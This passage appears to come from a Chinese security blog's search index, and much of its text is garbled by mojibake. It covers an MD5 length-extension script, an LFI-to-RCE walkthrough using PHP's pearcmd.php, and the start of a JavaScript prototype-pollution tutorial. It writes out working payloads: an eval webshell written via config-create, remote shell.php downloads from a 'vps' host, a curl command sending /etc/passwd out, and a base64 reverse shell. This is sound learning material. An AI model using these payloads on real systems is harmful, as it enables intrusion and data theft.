b=II(b,c,d,a,M9,21,0xeb86d391L) A += a B += b C += c D += d A = A&amp;0xffffffff B = B&amp;0xffffffff C = C&amp;0xffffffff D = D&amp;0xffffffff a = A b = B c = C d = D print \"%x,%x,%x,%x\"%(a,b,c,d) return show_md5(a,b,c,d) test.py # -*- coding: utf-8 -*- import my_md5 import sys import six MD5_Hash=sys.argv[1] length=int(sys.argv[2]) text=sys.argv[3] s1=eval('0x'+MD5_Hash[:8].decode('hex')[::-1].encode('hex')) s2=eval('0x'+MD5_Hash[8:16].decode('hex')[::-1].encode('hex')) s3=eval('0x'+MD5_Hash[16:24].decode('hex')[::-1].encode('hex')) s4=eval('0x'+MD5_Hash[24:32].decode('hex')[::-1].encode('hex')) secret = \"a\"*length test=secret+'\\x80'+'\\x00'*((512-length*8-8-8*8)/8)+six.int2byte(length*8)+'\\x00\\x00\\x00\\x00\\x00\\x00\\x00'+text s = my_md5.deal_rawInputMsg(test) r = my_md5.deal_rawInputMsg(secret) inp = s[len(r):] print 'å¡«å……å®Œçš„æ•°æ®ä¸º:'+test+' ' print '----------------------------------------------------------' print 'æ‰©å……å®Œçš„æ•°æ®ä¸º(16è¿›åˆ¶):'+s print '----------------------------------------------------------' print 'æˆªå–æœ€ååˆ†ç»„çš„æ•°æ®(16è¿›åˆ¶):'+inp print '----------------------------------------------------------' print 'æœ€ç»ˆå¡«å……ç»“æœä¸º:'+bytes(test).encode('hex') print \"å¡«å……åçš„md5ä¸º:\"+my_md5.run_md5(s1,s2,s3,s4,inp) 0x07 å‚è€ƒæ–‡ç«  MD5çš„Hashé•¿åº¦æ‰©å±•æ”»å‡» Hashæ‹“å±•é•¿åº¦æ”»å‡»åŸç†å‰–æ MD5æ‰©å±•é•¿åº¦æ”»å‡»ï¼ˆå®éªŒå§ â€”â€” è®©æˆ‘è¿›å»ï¼‰","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"æµ…æpearcmd.phpæ¼æ´","path":"/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/","content":"0x01 ç¯å¢ƒå‡†å¤‡ å®‰è£…php apt-get install php7.4 å®‰è£…pear apt-get install php-pear ä¸è¿‡è¿™é‡Œæ­ç¯å¢ƒæœ‰ç‚¹è´¹åŠ²ï¼Œæœ€ç»ˆè¿˜æ˜¯é€‰æ‹©dockerå§ï¼Œè¿™é‡Œç›´æ¥æ‹‰å–php-7.4:apacheè¿è¡Œå³å¯ 0x02 å‰ç½®çŸ¥è¯† peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚åœ¨7.3åŠä»¥å‰ï¼Œpecl/pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼› åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®šâ€“with-pearæ‰ä¼šå®‰è£…ã€‚åœ¨å‘½ä»¤è¡Œä¸‹å¯ä»¥ç”¨pearæˆ–php /usr/local/lib/php/pearcmd.phpè¿è¡Œï¼Œè™½ç„¶ä¸æ˜¯åœ¨webçš„ç›®å½•ä¸‹ï¼Œä½†æ˜¯å¦‚æœå­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿è¡Œè¿™ä¸ªå‘½ä»¤è¡Œå·¥å…· ä¸è¿‡ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcel/pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨/usr/local/lib/phpã€‚ è¦åˆ©ç”¨è¿™ä¸ªpearcmd.phpéœ€è¦æ»¡è¶³å‡ ä¸ªæ¡ä»¶ï¼š ï¼ˆ1ï¼‰.è¦å¼€å¯register_argc_argvè¿™ä¸ªé€‰é¡¹åœ¨Dockerä¸­æ˜¯è‡ªåŠ¨å¼€å¯çš„ ï¼ˆ2ï¼‰.è¦æœ‰æ–‡ä»¶åŒ…å«çš„åˆ©ç”¨ æˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹pearcmd.phpå¯ä»¥æ¥å—å“ªäº›å‘½ä»¤ Commands: build Build an Extension From C Source bundle Unpacks a Pecl Package channel-add Add a Channel channel-alias Specify an alias to a channel name channel-delete Remove a Channel From the List channel-discover Initialize a Channel from its server channel-info Retrieve Information on a Channel channel-login Connects and authenticates to remote channel server channel-logout Logs out from the remote channel server channel-update Update an Existing Channel clear-cache Clear Web Services Cache config-create Create a Default configuration file config-get Show One Setting config-help Show Information About Setting config-set Change Setting config-show Show All Settings convert Convert a package.xml 1.0 to package.xml 2.0 format cvsdiff Run a \"cvs diff\" for all files in a package cvstag Set CVS Release Tag download Download Package download-all Downloads each available package from the default channel info Display information about a package install Install Package list List Installed Packages In The Default Channel list-all List All Packages list-channels List Available Channels list-files List Files In Installed Package list-upgrades List Available Upgrades login Connects and authenticates to remote server [Deprecated in favor of channel-login] logout Logs out from the remote server [Deprecated in favor of channel-logout] makerpm Builds an RPM spec file from a PEAR package package Build Package package-dependencies Show package dependencies package-validate Validate Package Consistency pickle Build PECL Package remote-info Information About Remote Packages remote-list List Remote Packages run-scripts Run Post-Install Scripts bundled with a package run-tests Run Regression Tests search Search remote package database shell-test Shell Script Test sign Sign a package distribution file svntag Set SVN Release Tag uninstall Un-install Package update-channels Update the Channel List upgrade Upgrade Package upgrade-all Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters] Usage: pear [options] command [command-options] &lt;parameters&gt; Type \"pear help options\" to list all options. Type \"pear help shortcuts\" to list all command shortcuts. Type \"pear help version\" or \"pear version\" to list version information. Type \"pear help &lt;command&gt;\" to get the help for the specified command. 2.1 åŸç† phpçš„pearæ‰©å±•æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œæ‰©å±•ç®¡ç†å·¥å…·ï¼Œé»˜è®¤çš„å®‰è£…è·¯å¾„åœ¨/usr/local/lib/php/pearcmd.phpï¼Œåœ¨å‘½ä»¤è¡Œä¸‹å¯ä»¥ç”¨pearæˆ–php /usr/local/lib/php/pearcmd.phpè¿è¡Œï¼Œè™½ç„¶ä¸æ˜¯åœ¨webçš„ç›®å½•ä¸‹ï¼Œä½†æ˜¯å¦‚æœå­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿è¡Œè¿™ä¸ªå‘½ä»¤è¡Œå·¥å…· æˆ‘ä»¬å†æ¥çœ‹register_argc_argvé€‰é¡¹ï¼Œåœ¨è¿™ä¸ªé€‰é¡¹å­—æ®µå¦‚æœé€‰äº†ONçš„è¯ï¼ŒURLä¸­?åé¢çš„å†…å®¹ä¼šå…¨éƒ¨ä¼ å…¥è‡³$_SERVER['argv']è¿™ä¸ªå˜é‡å†…ï¼Œæ— è®ºåé¢çš„å†…å®¹æ˜¯å¦æœ‰ç­‰å·ã€‚ pearä¼šåœ¨pearcmd.phpè·å–å‘½ä»¤è¡Œå‚æ•° // è¿™ä¸€è¡Œä»£ç è®¾ç½® PEAR å‘½ä»¤çš„å‰ç«¯ç±»å‹ä¸º CLIã€‚è¿™æ„å‘³ç€æ¥ä¸‹æ¥çš„ PEAR å‘½ä»¤å°†åœ¨å‘½ä»¤è¡Œç•Œé¢ä¸­æ‰§è¡Œã€‚ PEAR_Command::setFrontendType('CLI'); //è¿™ä¸€è¡Œè·å–æ‰€æœ‰å¯ç”¨çš„ PEAR å‘½ä»¤ $all_commands = PEAR_Command::getCommands(); //è¯»å– PHP çš„å‘½ä»¤è¡Œå‚æ•°ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨ $argv å˜é‡ä¸­ã€‚è¿™æ˜¯ä¸ºäº†è·å–ç”¨æˆ·åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥çš„å‚æ•°ã€‚ $argv = Console_Getopt::readPHPArgv(); // fix CGI sapi oddity - the -- in pear.bat/pear is not removed if (php_sapi_name() != 'cli' &amp;&amp; isset($argv[1]) &amp;&amp; $argv[1] == '--') { unset($argv[1]); $argv = array_values($argv); } ä¸Šé¢çš„ifä»£ç å—å¤„ç† CGI sapi çš„ç‰¹æ®Šæƒ…å†µã€‚å¦‚æœå½“å‰çš„ PHP è¿è¡Œç¯å¢ƒä¸æ˜¯ CLIï¼ˆCommand Line Interfaceï¼‰ï¼Œå¹¶ä¸” $argv ä¸­çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ '--'ï¼Œåˆ™ç§»é™¤è¿™ä¸ª '--' å‚æ•°ã€‚è¿™å¯èƒ½æ˜¯ä¸ºäº†å¤„ç†åœ¨ CGI ç¯å¢ƒä¸‹è°ƒç”¨ PEAR å‘½ä»¤æ—¶çš„ä¸€äº›ç‰¹æ®Šæƒ…å†µã€‚ è€Œpearè·å–å‘½ä»¤è¡Œå‚æ•°çš„å‡½æ•°Consoles/Getopt.php-&gt;readPHPArgv()ä¸­ public static function readPHPArgv() { global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = \"Could not read cmd args (register_argc_argv=Off?)\"; return PEAR::raiseError(\"Console_Getopt: \" . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv; } ä¼šå…ˆå°è¯•$argvå˜é‡ï¼ˆè¿™ä¸ªå˜é‡å‚¨å­˜åœ¨å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¿è¡Œphpè„šæœ¬æ—¶ä¼ å…¥çš„å‚æ•°ï¼‰ï¼Œç„¶åå†å°è¯•$_SERVER['argv']å˜é‡ï¼Œ$_SERVER['argv']ä¸ºæˆ‘ä»¬å¯æ§çš„å˜é‡ï¼Œè¿™æ ·ï¼Œåœ¨æ–‡ä»¶åŒ…å«çš„åœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿è¡Œpearå‘½ä»¤è¡Œå·¥å…·å¹¶ç”¨GETè¯·æ±‚å‚æ•°æ§åˆ¶pearçš„å‘½ä»¤è¡Œå‚æ•°äº†ã€‚ $_SERVER[â€˜argvâ€™]æ‰€è·å–çš„æ•°ç»„ï¼Œå°±æ˜¯åœ¨å‘½ä»¤è¡Œæ¨¡å¼ä¸‹argv[0]æ˜¯è„šæœ¬åï¼Œåè¾¹ä¾æ¬¡ä¸ºå‚æ•° 2.2 register_argc_argv php.inié»˜è®¤ä¸ºoffï¼Œï¼ˆå½“ä¸‹è½½çš„phpä¸­ä¸å­˜åœ¨php.iniæ—¶ï¼Œé»˜è®¤ä¸ºOn)ã€‚ cliæ¨¡å¼ ä¸éœ€è¦å¼€å¯php.iniï¼Œå³å¯é€šè¿‡$_SERVER[â€˜argvâ€™]è·å–å‘½ä»¤è¡Œå‚æ•°ï¼Œå’Œcmdä¸€æ · webæ¨¡å¼ åœ¨webæ¨¡å¼ä¸‹å¿…é¡»åœ¨php.iniå¼€å¯register_argc_argvé…ç½®é¡¹ è®¾ç½®register_argc_argv = On(é»˜è®¤æ˜¯Off)ï¼Œé‡å¯æœåŠ¡ï¼Œ$_SERVER[â€˜argvâ€™]æ‰ä¼šæœ‰æ•ˆæœ è¿™æ—¶å€™çš„$_SERVER[â€˜argvâ€™][0] = $_SERVER[â€˜QUERY_STRINGâ€™] cliæ¨¡å¼ä¸‹çš„argvåœ¨webæ¨¡å¼ä¸‹ä¸é€‚ç”¨ è¯¥å˜é‡æ˜¯å¯¹queryStringä»¥+å·è¿›è¡Œåˆ‡å‰²ï¼Œè€Œä¸æ˜¯&amp; 2.3 register_argc_argvå’Œpearçš„è”ç³» #!/bin/sh # first find which PHP binary to use if test \"x$PHP_PEAR_PHP_BIN\" != \"x\"; then PHP=\"$PHP_PEAR_PHP_BIN\" else if test \"/usr/bin/php\" = '@'php_bin'@'; then PHP=php else PHP=\"/usr/bin/php\" fi fi # then look for the right pear include dir if test \"x$PHP_PEAR_INSTALL_DIR\" != \"x\"; then INCDIR=$PHP_PEAR_INSTALL_DIR INCARG=\"-d include_path=$PHP_PEAR_INSTALL_DIR\" else if test \"/usr/share/php\" = '@'php_dir'@'; then INCDIR=`dirname $0` INCARG=\"\" else INCDIR=\"/usr/share/php\" INCARG=\"-d include_path=/usr/share/php\" fi fi exec $PHP -C -q $INCARG -d date.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir=\"\" -d safe_mode=0 -d register_argc_argv=\"On\" -d auto_prepend_file=\"\" -d auto_append_file=\"\" $INCDIR/pearcmd.php \"$@\" pearæœ¬è´¨ä¸Šå°±æ˜¯ä¸ªshæ–‡ä»¶ï¼Œä¸Šé¢æ˜¯æ–‡ä»¶å†…å®¹ã€‚ é‡ç‚¹å°±æ˜¯å½“æ‰§è¡Œäº†pearæ—¶ï¼Œä¼šå°†$_SERVER[â€˜argvâ€™]å½“ä½œå‚æ•°ä¸€èµ·æ‰§è¡Œï¼Œä»è€Œè‡ªåŠ¨æ‹‰å–äº†æŒ‡å®šçš„phpæ–‡ä»¶ 2.4 åˆ©ç”¨æ–¹æ³• å½“æœ‰å­˜åœ¨æœ‰é™åˆ¶çš„æ–‡ä»¶åŒ…å«æ¼æ´æ—¶ï¼Œåˆ©ç”¨è¯¥æ¼æ´ï¼Œå…ˆè¿œç¨‹æ‹‰å–æ¶æ„æ–‡ä»¶åˆ°/tmpç­‰æƒé™è¦æ±‚ä½çš„ç›®å½•ä¸‹ï¼Œå†åˆ©ç”¨æ–‡ä»¶åŒ…å« åˆ©ç”¨å‰æ 1.å¼€å¯äº†register_argc_argv 2.è¦æœ‰pearç®¡ç†åŒ… 3.æ— basedirçš„é™åˆ¶ 4.å…è®¸åŒ…å«phpæ–‡ä»¶ 0x03 æ¼æ´åˆ©ç”¨ ä¸‹é¢æ˜¯æµ‹è¯•æ–‡ä»¶ä»£ç  &lt;?php include($_GET['file']); ?&gt; è¿™å…¶ä¸­çš„fileå‚æ•°å°±æ˜¯ç”¨æ¥åŒ…å«pearcmd.phpæ–‡ä»¶çš„ï¼Œä»¥ä¾¿å¯ä»¥å°†æˆ‘ä»¬çš„æ¶æ„å‘½ä»¤æ¥å—å¹¶æ‰§è¡Œ 3.1 config-create æ­¤æ–¹æ³•æ¥è‡ªäºpç¥åšå®¢ æ­¤å‘½ä»¤çš„å‚æ•°å’Œç”¨æ³•å¦‚ä¸‹ï¼š config-create: must have 2 parameters, root path and filename to save as é˜…è¯»å…¶ä»£ç å’Œå¸®åŠ©ï¼Œå¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªå‘½ä»¤éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚ å¯ä»¥ç›´æ¥å¾€webç›®å½•å†™å…¥webshellï¼Œä¹Ÿå¯ä»¥å¾€/tmp/ç›®å½•å†™å…¥ä»»æ„æ–‡ä»¶åä»»æ„å†…å®¹ï¼Œç„¶åé€šè¿‡æ–‡ä»¶åŒ…å«å»åŒ…å«ï¼Œåœ¨dockerç¯å¢ƒä¸­pcel/pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨/usr/local/lib/phpï¼ˆä½†ä¸åŒç³»ç»Ÿçš„è·¯å¾„å¯èƒ½ä¸åŒï¼‰ å°è¯•ä¸€ä¸‹ä½¿ç”¨ä»¥ä¸‹è¿™ä¸ªå‘½ä»¤çœ‹ä¸‹æ•ˆæœ pear config-create /114514whatever /tmp/test.txt ä¸è¿‡è¿™é‡Œç–‘æƒ‘ä¸ºä½•test.txtæ–‡ä»¶å†…å®¹æ˜¯è¿™æ ·çš„ï¼Œåœ¨é˜…è¯»äº†ä¸Šè¿°pç¥çš„æ–‡ç« å‘ç°ï¼Œè¿™é‡Œä¼°è®¡æ˜¯åœ¨æ‰§è¡Œç¬¬ä¸€ä¸ªå‚æ•°åæ‰€äº§ç”Ÿçš„ç»“æœè¢«åºåˆ—åŒ–å­˜å‚¨äº†ï¼ˆä¼°è®¡æ˜¯sessionæ–‡ä»¶ï¼‰ä¹‹åè¢«æˆ‘ä»¬çš„å‘½ä»¤è¡Œæ”¾å…¥åˆ°äº†test.txtæ–‡ä»¶ä¸­è€Œå·²ã€‚ é‚£æ ¹æ®ä¸Šé¢æˆ‘ä»¬çŸ¥é“ç¬¬ä¸€ä¸ªå‚æ•°çš„å†…å®¹ä¼šè¢«å†™å…¥æ–‡ä»¶ï¼Œå¦‚æœæˆ‘ä»¬å°†ç¬¬ä¸€ä¸ªå‚æ•°æ¢æˆæ–‡ä»¶å†…å®¹çš„è¯æˆ‘ä»¬å°±å¯ä»¥å†™å…¥å¯åŒ…å«çš„æ–‡ä»¶äº† payloadï¼š ?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST['cmd']);?&gt;+/tmp/test.php èšå‰‘è¿æ¥çœ‹çœ‹ï¼Œå¦‚ä¸‹å›¾æˆåŠŸé“¾æ¥ æˆ‘ä»¬æ¥çœ‹ä¸‹å†™å…¥çš„æ–‡ä»¶ å¯ä»¥çœ‹è§/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST['cmd']);?&gt;æ•´ä¸ªè¢«ä½œä¸ºå‚æ•°ä¼ å…¥äº†å‘½ä»¤è¡Œï¼Œä½†æ˜¯getå‚æ•° fileè¢«æ­£å¸¸è§£æäº†ï¼Œè¿™æ˜¯å› ä¸ºå‰é¢è¯´è¿‡çš„å³ä½¿URLä¸­å­˜åœ¨ç­‰å·ï¼Œé—®å·åçš„å†…å®¹ä¸€æ ·ä¼šè¢«ä¼ å…¥$_SERVER['argv'] 3.2 install æ­¤æ–¹æ³•æ¥è‡ªjrXnmå¸ˆå‚…çš„åšå®¢ å…ˆæ¥çœ‹çœ‹installçš„å¸¸è§„ç”¨æ³•ï¼švpsä¸ŠæŒ‚äº†ä¸€ä¸ªphpæ–‡ä»¶ &lt;?php phpinfo(); ?&gt; ç„¶åé€šè¿‡pearä¸‹è½½ pear install http://[vps]:[port]/flag.php ç»“æœï¼š å¯ä»¥çœ‹åˆ°æˆåŠŸä¸‹è½½ ç»“æœåœ¨/tmp/pear/download/ç›®å½•ä¸‹æœ‰ä¸€ä¸ªflag.php ç„¶åinstallæœ‰--installrootè¿™ä¸ªé€‰é¡¹å¯ä»¥æŒ‡å®šä»–çš„å®‰è£…ç›®å½•ï¼Œè¿™é‡Œå¯ä»¥æ„é€ payloadè¿œç¨‹ä¸‹è½½æˆ‘ä»¬çš„æ–‡ä»¶äº† http://localhost:3354/?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps]:[port]/flag.php å¦‚ä¸Šå›¾æˆåŠŸåŒ…å« 3.3 download å…ˆæŸ¥çœ‹ä¸€ä¸‹downloadçš„ç”¨æ³• pear download [option] [package] #è¿™é‡Œçš„optionåªæœ‰ä¸€ä¸ª-Z, --nocompressï¼Œä¸‹è½½ä¸€ä¸ªæœªå‹ç¼©çš„taråŒ… å°è¯•ä¸€ä¸‹ä¸‹æ¶æ„çš„phpæ–‡ä»¶ è™½ç„¶æç¤ºä¸‹è½½é”™è¯¯ï¼Œä½†æ˜¯åœ¨å½“å‰ç›®å½•ä¸‹ç›´æ¥ç•™ä¸‹äº†æ¶æ„æ–‡ä»¶ã€‚ æˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸‹åˆ©ç”¨è¿™ä¸ªdownload æˆ‘æ„é€ çš„payloadä¸º ?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps/shell.php ç„¶åç›´æ¥è®¿é—®shellï¼ŒæˆåŠŸ ?file=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps/shell.php 0x04 è¿‡æ»¤percmd å¦‚æœpearcmdå…³é”®è¯è¢«banæ€ä¹ˆåŠï¼Œå…¶å®å¯ä»¥ç”¨peclcmd.phpæ¥ä»£æ›¿ï¼Œåœ¨è¿™ä¸ªphpæ–‡ä»¶å½“ä¸­å…¶å®å°±æ˜¯å¼•å…¥äº†pearcmd.php if ('/www/server/php/52/lib/php' != '@'.'include_path'.'@') { ini_set('include_path', '/www/server/php/52/lib/php'); $raw = false; } else { // this is a raw, uninstalled pear, either a cvs checkout, or php distro $raw = true; } define('PEAR_RUNTYPE', 'pecl'); require_once 'pearcmd.php'; 0x05 å‚è€ƒæ–‡ç«  å…³äºåˆ©ç”¨pearcmdè¿›è¡Œæ–‡ä»¶åŒ…å«çš„ä¸€äº›æ€»ç»“ Docker PHPè£¸æ–‡ä»¶æœ¬åœ°åŒ…å«ç»¼è¿° â€“ pç¥ï¼ [webå®‰å…¨] åˆ©ç”¨pearcmd.phpä»LFIåˆ°getshell æ–‡ä»¶åŒ…å«ä¹‹Pearcmd.phpçš„åˆ©ç”¨ å…³äºpearcmdåˆ©ç”¨æ€»ç»“ [LFIåŒ…å«pearcmdå‘½ä»¤æ‰§è¡Œå­¦ä¹ ]","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"JavaScriptåŸå‹é“¾æ±¡æŸ“å­¦ä¹ ","path":"/2023/10/29/javascript-yuan-xing-lian-wu-ran/","content":"0x01 å‰è¨€ æœ€è¿‘æ–°ç”Ÿèµ›è€æ˜¯ç¢°åˆ°JavaScriptåŸå‹é“¾é¢˜ç›®ï¼Œæˆ‘çº³é—·å„¿å‘¢ï¼Œè¿™ç©æ„å„¿ä¹Ÿç®—æ–°ç”Ÿéš¾åº¦äº†ï¼Ÿï¼Ÿï¼Ÿâ”­â”®ï¹â”­â”®ç»ˆç©¶æ˜¯æˆ‘å¤ªèœäº†ã€‚è¯ä¸å¤šè¯´ï¼Œç›´æ¥å¼€å·ï¼ï¼ï¼ä»¥ä¸‹å‡ ä¹éƒ½æ˜¯è½¬è½½çš„å‚è€ƒæ–‡ç« ï¼Œè¯·è§è°…â”­â”®ï¹â”­â”® 0x02 å±é™©å‡½æ•°æ‰€å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œ 2.1 eval() eval() å‡½æ•°å¯è®¡ç®—æŸä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„çš„ JavaScript ä»£ç ã€‚å’ŒPHPä¸­evalå‡½æ•°ä¸€æ ·ï¼Œå¦‚æœä¼ é€’åˆ°å‡½æ•°ä¸­çš„å‚æ•°å¯æ§å¹¶ä¸”æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤æ—¶ï¼Œå°±ä¼šå¯¼è‡´æ¼æ´çš„å‡ºç°ã€‚ ç®€å•ä¾‹å­ï¼šmain.js var express = require(\"express\"); var app = express(); app.get('/eval',function(req,res){ res.send(eval(req.query.q)); console.log(req.query.q); }) var server = app.listen(8888, function() { console.log(\"åº”ç”¨å®ä¾‹ï¼Œè®¿é—®åœ°å€ä¸º http://127.0.0.1:8888/\"); }) æ¼æ´åˆ©ç”¨ï¼š Node.jsä¸­çš„chile_process.execè°ƒç”¨çš„æ˜¯/bash.shï¼Œå®ƒæ˜¯ä¸€ä¸ªbashè§£é‡Šå™¨ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚åœ¨evalå‡½æ•°çš„å‚æ•°ä¸­å¯ä»¥æ„é€ require('child_process').exec('');æ¥è¿›è¡Œè°ƒç”¨ã€‚ å¼¹è®¡ç®—å™¨(windows)ï¼š /eval?q=require('child_process').exec('calc'); è¯»å–æ–‡ä»¶(linux)ï¼š /eval?q=require('child_process').exec('curl -F \"x=`cat /etc/passwd`\" http://vps');; åå¼¹shell(linux)ï¼š /eval?q=require('child_process').exec('echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash'); YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYxæ˜¯bash -i &gt;&amp; /dev/tcp/127.0.0.1/3333 0&gt;&amp;1 BASE64åŠ å¯†åçš„ç»“æœï¼Œç›´æ¥è°ƒç”¨ä¼šæŠ¥é”™ã€‚ æ³¨æ„ï¼šBASE64åŠ å¯†åçš„å­—ç¬¦ä¸­æœ‰ä¸€ä¸ª+å·éœ€è¦urlç¼–ç ä¸º%2B(ä¸€å®šæƒ…å†µä¸‹) å¦‚æœä¸Šä¸‹æ–‡ä¸­æ²¡æœ‰require(ç±»ä¼¼äºCode-Breaking 2018 Thejs)ï¼Œåˆ™å¯ä»¥ä½¿ç”¨global.process.mainModule.constructor._load('child_process').exec('calc')æ¥æ‰§è¡Œå‘½ä»¤ paypalä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„ä¾‹å­ï¼š demo.paypal.com] Node.js code injection (RCE) (ä½¿ç”¨æ•°ç»„ç»•è¿‡è¿‡æ»¤ï¼Œå†è°ƒç”¨child_processæ‰§è¡Œå‘½ä»¤) 2.2 ç±»ä¼¼å‘½ä»¤ é—´éš”ä¸¤ç§’æ‰§è¡Œå‡½æ•°ï¼š setInteval(some_function, 2000) ä¸¤ç§’åæ‰§è¡Œå‡½æ•°ï¼š setTimeout(some_function, 2000); some_functionå¤„å°±ç±»ä¼¼äºevalå‡½æ•°çš„å‚æ•° è¾“å‡ºHelloWorldï¼š Function(â€œconsole.log(â€˜HelloWolrdâ€™)â€)() ç±»ä¼¼äºphpä¸­çš„create_function ä»¥ä¸Šéƒ½å¯ä»¥å¯¼è‡´å‘½ä»¤æ‰§è¡Œ 0x03 JavaScriptç±» 3.1 ç±»çš„å£°æ˜ ä¸‹é¢æ˜¯ä¸€ä¸ªåŸºæœ¬çš„ JavaScript ç±»çš„å£°æ˜ class Calculator { constructor(num) { this.num = num } applyAdd(op) { this.num += op return this } applySub(op) { this.num -= op return this } static add(num1, num2) { return num1 + num2 } static sub(num1, num2) { return num1 - num2 } } ç„¶åæˆ‘ä»¬åˆ›å»ºç±»çš„å®ä¾‹ let calc = new Calculator(1) console.log(calc.num) console.log(calc.applyAdd(2).num) console.log(Calculator.sub(11, 5)) åŸºäºæˆ‘ä»¬åœ¨å…¶å®ƒç¼–ç¨‹è¯­è¨€çš„ä¹ æƒ¯ï¼Œä¸Šé¢çš„ä»£ç éå¸¸æ˜“äºç†è§£ ä¸Šè¿°ä»£ç ä¸­ï¼Œnumç§°ä¸ºç±»Calculatorçš„å±æ€§ï¼ŒapplyAddã€applySubç§°ä¸ºç±»Calculatorçš„æ–¹æ³•ï¼Œaddã€subç§°ä¸ºç±»Calculatorçš„é™æ€æ–¹æ³• åœ¨ ES6 ä¹‹å‰ï¼ŒJavaScript å¹¶æ²¡æœ‰æä¾› class è¯­æ³•ï¼Œç±»çš„åŠŸèƒ½æ˜¯åŸºäºå‡½æ•°ï¼ˆfunctionï¼‰æ¥å®ç°çš„ï¼Œå¦‚ä¸‹ // åˆ›å»ºç±» function Calculator(num) { this.num = num } Calculator.prototype.applyAdd = function (op) { this.num += op return this } Calculator.prototype.applySub = function (op) { this.num -= op return this } Calculator.add = function (num1, num2) { return num1 + num2 } Calculator.sub = function (num1, num2) { return num1 - num2 } // åˆ›å»ºå®ä¾‹ let calc = new Calculator(1) console.log(calc.num) console.log(calc.applyAdd(2).num) console.log(Calculator.sub(11, 5)) ç°åœ¨æˆ‘ä»¬æ³¨æ„ä¸‹é¢å‡ ä¸ªç»†èŠ‚ ç”¨å‡½æ•°å®ç°æ—¶ï¼Œfunction Calculatorçš„å†…å®¹ï¼ˆå‚æ•°ã€å‡½æ•°ä½“ï¼‰ä¸ç”¨ç±»å®ç°æ—¶çš„constructorç›¸åŒ ç”¨å‡½æ•°å®ç°æ—¶ï¼Œæ–¹æ³•applyAddã€applySubå£°æ˜åœ¨Calculator.prototypeå±‚ä¸­ ç”¨å‡½æ•°å®ç°æ—¶ï¼Œé™æ€æ–¹æ³•addã€subç›´æ¥å£°æ˜åœ¨Calculatorå±‚ä¸­ 3.2 new åšäº†ä»€ä¹ˆ å¯ä»¥è¯´ JavaScript çš„ä»»ä½•ä¸€ä¸ªå¯¹è±¡éƒ½æ˜¯ä¸€ä¸ª Objectï¼Œä¸è®ºæ˜¯Number``String``Arrayç­‰ï¼Œå®ƒä»¬éƒ½å…·æœ‰ä¸€ç§ JSON ç»“æ„ï¼ˆæ³¨æ„ï¼ŒJavaScript ä¸­å«æœ‰JSONç±»ï¼Œæ­¤å¤„çš„ JSON æ³›æŒ‡ä¸€ç§æ•°æ®ç»“æ„ï¼Œä¸JSONç±»æ— å…³ï¼‰ï¼Œæˆ‘ä»¬ç§°ä¸ºâ€œå¯¹è±¡â€ï¼Œä¸ºäº†ä¸ç±»åˆ›å»ºçš„å®ä¾‹ï¼ˆä¹Ÿç§°ä¸ºâ€œå¯¹è±¡â€ï¼‰ä½œåŒºåˆ†ï¼Œæˆ‘ä»¬ç§°ç±»åˆ›å»ºçš„å®ä¾‹ä¸ºâ€œå®ä¾‹â€ï¼Œâ€œå®ä¾‹â€ä¹Ÿæ˜¯â€œå¯¹è±¡â€ 